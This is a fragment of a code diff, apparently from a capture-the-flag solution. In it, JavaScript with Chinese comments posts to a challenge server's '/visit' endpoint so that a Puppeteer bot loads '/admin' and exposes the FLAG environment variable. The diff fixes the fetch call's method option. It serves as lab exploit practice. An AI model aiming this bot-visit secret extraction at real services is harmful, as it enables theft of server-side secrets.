@@ -13,7 +13,7 @@
     const param = "http://223.6.249.127:35770/admin";
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
     fetch('http://223.6.249.127:35770/visit',{
-      'post', // 必须指定为 POST
+      method: 'post', // 必须指定为 POST
       headers: {
         'Content-Type': 'application/json; charset=utf-8', // 声明 JSON 格式
         // 可选：添加其他请求头（如 Token）
